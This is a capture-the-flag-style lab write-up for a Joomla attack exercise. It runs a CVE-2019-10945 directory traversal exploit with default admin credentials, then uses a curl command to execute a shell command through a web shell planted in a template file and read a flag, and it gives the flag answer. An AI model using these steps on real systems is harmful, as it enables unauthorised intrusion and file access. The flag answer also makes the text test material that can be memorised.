# Section 05: Joomla - Discovery & Emuneration

Module: 24. Attacking Common Applications

---

## Questions & Answers

### 1. Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)

Context:
- Directory traversal:
```bash
┌─[eu-academy-2]─[10.10.14.46]─[htb-ac-2162140@htb-3zjlds7dty-htb-cloud-com]─[~]
└──╼ [★]$ python3 CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
/home/htb-ac-2162140/CVE-2019-10945.py:52: SyntaxWarning: invalid escape sequence '\ '
  | |  | |   /\   |  _ \ / __ \ / __ \|  _ \
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
flag_6470e394cbf6dab6a91682cc8585059b.txt
htaccess.txt
index.php
robots.txt
web.config.txt
```
- Follow the instructions of the section to get RCE:
```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=cat%20../../flag_6470e394cbf6dab6a91682cc8585059b.txt
```

**Answer:** `j00mla_c0re_d1rtrav3rsal!`

---

[Back to Module Index](./README.md)
